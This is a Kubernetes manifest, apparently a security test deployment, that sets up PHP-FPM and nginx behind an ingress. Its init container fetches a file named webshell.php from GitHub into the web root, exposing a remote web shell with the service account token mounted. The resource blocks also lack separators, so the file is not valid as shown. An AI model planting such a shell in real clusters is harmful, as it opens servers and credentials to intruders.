---
# Copyright The Ubiquity Authors.
#
# Licensed under the Apache License, Version 2.0. Previously licensed under the Functional Source License (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://github.com/ubiquitycluster/ubiquity/blob/main/LICENSE
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# This software was previously licensed under the Functional Source License but has now transitioned to an Apache 2.0 License
# as of June 2025.
# See the License for the specific language governing permissions and
# limitations under the License.

apiVersion: v1
kind: Service
metadata:
  name: php
  labels:
    tier: backend
spec:
  selector:
    app: php
    tier: backend
  ports:
    - protocol: TCP
      port: 9000

apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: code
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 1Gi
  storageClassName: local-path

apiVersion: apps/v1
kind: Deployment
metadata:
  name: php
  labels:
    tier: backend
spec:
  replicas: 1
  selector:
    matchLabels:
      app: php
      tier: backend
  template:
    metadata:
      labels:
        app: php
        tier: backend
    spec:
      automountServiceAccountToken: true
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
      volumes:
        - name: code
          persistentVolumeClaim:
            claimName: code
      containers:
        - name: php
          image: php:7-fpm
          volumeMounts:
            - name: code
              mountPath: /code
      initContainers:
        - name: install
          image: busybox
          volumeMounts:
            - name: code
              mountPath: /code
          command:
            - wget
            - "-O"
            - "/code/index.php"
            - https://raw.githubusercontent.com/alegrey91/systemd-service-hardening/master/ansible/files/webshell.php

apiVersion: v1
kind: ConfigMap
metadata:
  name: nginx-config
  labels:
    tier: backend
data:
  config: |
      index index.php index.html;
      error_log  /tmp/error.log;
      access_log /tmp/access.log;
      root /code;

      location / {
          try_files $uri $uri/ /index.php?$query_string;
      }

      location ~ \.php$ {
          try_files $uri =404;
          fastcgi_split_path_info ^(.+\.php)(/.+)$;
          fastcgi_pass php:9000;
          fastcgi_index index.php;
          include fastcgi_params;
          fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
          fastcgi_param PATH_INFO $fastcgi_path_info;
        }

apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx
  labels:
    tier: backend
spec:
  replicas: 1
  selector:
    matchLabels:
      app: nginx
      tier: backend
  template:
    metadata:
      labels:
        app: nginx
        tier: backend
    spec:
      volumes:
        - name: code
          persistentVolumeClaim:
            claimName: code
        - name: config
          configMap:
            name: nginx-config
            items:
              - key: config
                path: site.conf
      containers:
        - name: nginx
          image: bitnami/nginx
          ports:
            - containerPort: 8080
          volumeMounts:
            - name: code
              mountPath: /code
            - name: config
              mountPath: /opt/bitnami/nginx/conf/bitnami/

apiVersion: v1
kind: Service
metadata:
  name: nginx-php
  labels:
    tier: backend
spec:
  selector:
    app: nginx
    tier: backend
  ports:
    - protocol: TCP
      port: 8080

apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: security-pod-ingress
  annotations:
    nginx.ingress.kubernetes.io/backend-protocol: "HTTP"
spec:
  rules:
    - host: testweb.192.168.1.200.nip.io
      http:
        paths:
          - path: /
            pathType: Prefix
            backend:
              service:
                name: nginx-php
                port:
                  number: 8080
